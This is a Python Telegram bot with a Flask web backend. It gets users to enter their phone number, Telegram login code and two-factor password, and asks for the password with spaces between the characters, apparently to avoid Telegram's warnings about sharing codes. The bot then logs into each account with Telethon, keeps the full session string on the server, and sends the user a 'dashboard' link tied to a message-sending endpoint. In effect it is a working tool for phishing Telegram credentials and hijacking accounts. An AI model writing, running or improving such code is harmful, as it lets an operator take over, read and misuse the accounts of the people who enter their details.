import os
import secrets
from flask import Flask, request, jsonify, send_file
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BASE_URL = os.environ.get("BASE_URL", "")

app = Flask(__name__)
sessions = {}
user_tokens = {}

PHONE, CODE, PASSWORD = range(3)

# ── BOT HANDLERS ──

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["phone"] = phone
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        context.user_data["client"] = client
        await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
        return ConversationHandler.END

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    phone = context.user_data["phone"]
    client = context.user_data["client"]
    try:
        await client.sign_in(phone, code)
        return await finish_login(update, context, client)
    except SessionPasswordNeededError:
        await update.message.reply_text(
            "🔐 حسابك عنده مصادقة ثنائية!\n\n"
            "أرسل كلمة المرور بشكل مفرق\n"
            "مثال: إذا كلمتك hello123 أرسلها:\n"
            "h e l l o 1 2 3"
        )
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ الرمز خاطئ: {e}\nأرسل الرمز مرة ثانية:")
        return CODE

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    password = raw.replace(" ", "")
    client = context.user_data["client"]
    try:
        await client.sign_in(password=password)
        return await finish_login(update, context, client)
    except Exception as e:
        await update.message.reply_text(
            "❌ كلمة المرور خاطئة\n"
            "حاول مرة ثانية، تذكر تفرق الحروف بمسافات:"
        )
        return PASSWORD

async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client):
    phone = context.user_data["phone"]
    session_str = client.session.save()
    sessions[phone] = session_str
    user_id = update.effective_user.id
    token = secrets.token_hex(16)
    user_tokens[user_id] = token
    dashboard_url = f"{BASE_URL}/dashboard?token={token}"
    keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
    await update.message.reply_text(
        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("تم الإلغاء. اكتب /start للبدء من جديد.")
    return ConversationHandler.END

# ── FLASK ROUTES ──

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/dashboard")
def dashboard():
    token = request.args.get("token")
    if not token or token not in user_tokens.values():
        return "غير مصرح", 403
    return send_file("index.html")

@app.route("/api/send", methods=["POST"])
def send_messages():
    data = request.json
    phone = data.get("phone")
    if not sessions.get(phone):
        return jsonify({"error": "لا توجد جلسة"}), 401
    return jsonify({"status": "ok"})

# ── MAIN ──

def run_bot():
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    application = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(conv)
    loop.run_until_complete(application.run_polling())

if __name__ == "__main__":
    import threading
    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
